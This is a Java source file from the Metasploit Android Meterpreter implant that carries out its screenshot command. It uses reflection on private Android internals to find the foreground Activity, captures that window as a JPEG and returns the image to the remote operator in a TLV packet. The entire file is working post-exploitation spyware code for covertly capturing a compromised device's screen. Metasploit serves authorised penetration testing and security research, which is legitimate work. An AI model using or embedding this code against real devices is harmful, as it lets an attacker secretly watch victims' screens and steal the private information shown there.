package com.metasploit.meterpreter.android;

import android.app.Activity;
import android.graphics.Bitmap;
import android.view.View;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.util.Map;

public class stdapi_ui_desktop_screenshot implements Command {

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        int quality = request.getIntValue(TLVType.TLV_TYPE_DESKTOP_SCREENSHOT_QUALITY);
        Activity activity = getActivity();
        if (activity == null) {
            return ERROR_SUCCESS;
        }
        response.add(TLVType.TLV_TYPE_DESKTOP_SCREENSHOT, grabScreen(activity, quality));
        return ERROR_SUCCESS;
    }

    private static Activity getActivity() throws Exception {
        Class activityThreadClass = Class.forName("android.app.ActivityThread");
        Object activityThread = activityThreadClass.getMethod("currentActivityThread").invoke(null);
        Field activitiesField = activityThreadClass.getDeclaredField("mActivities");
        activitiesField.setAccessible(true);

        Map<Object, Object> activities = (Map<Object, Object>) activitiesField.get(activityThread);
        if(activities == null)
            return null;

        for (Object activityRecord : activities.values()) {
            Class activityRecordClass = activityRecord.getClass();
            Field pausedField = activityRecordClass.getDeclaredField("paused");
            pausedField.setAccessible(true);
            if (!pausedField.getBoolean(activityRecord)) {
                Field activityField = activityRecordClass.getDeclaredField("activity");
                activityField.setAccessible(true);
                Activity activity = (Activity) activityField.get(activityRecord);
                return activity;
            }
        }
        return null;
    }

    private byte[] grabScreen(Activity activity, int quality) throws Exception {
        View v1 = activity.getWindow().getDecorView().getRootView();
        v1.setDrawingCacheEnabled(true);
        Bitmap bitmap = Bitmap.createBitmap(v1.getDrawingCache());
        v1.setDrawingCacheEnabled(false);
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream);
        outputStream.flush();
        return outputStream.toByteArray();
    }
}
